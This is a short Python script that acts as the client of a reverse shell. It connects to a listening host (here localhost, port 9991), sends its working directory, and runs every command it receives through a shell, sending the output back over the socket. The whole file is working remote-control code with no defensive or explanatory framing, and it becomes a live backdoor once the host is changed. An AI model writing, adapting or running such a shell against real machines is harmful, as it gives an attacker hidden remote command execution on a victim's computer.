import os
import socket
import subprocess
import platform

s = socket.socket()
host = 'localhost'
port = 9991
s.connect((host, port))  # the socket


def command():
    while True:
        s.send(str.encode(str(os.getcwd())))
        data = s.recv(2048)
        if len(data) > 0:
            data_str = str(data, "utf-8")
            if data_str[:2] == 'cd':
                if data_str == 'cd' or data_str == 'cd ':
                    os.chdir('/')
                    s.send(str.encode('Directory changed to home'))
                    continue
                elif (len(data_str)) > 2:
                    os.chdir(data_str[3:])
                    s.send(str.encode('Directory changed'))
                    continue
                else:
                    print("Invalid format use cd or cd <directory>\n")
            if data == 'os info':
                osname = platform.system()
                s.send(str.encode(osname, "utf-8"))
            else:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                if output_str == '' or output_str == None:
                    s.send(str.encode('The output is empty\n'))
                    continue
                s.send(str.encode(output_str))
                print(output_str)


command()
s.close()
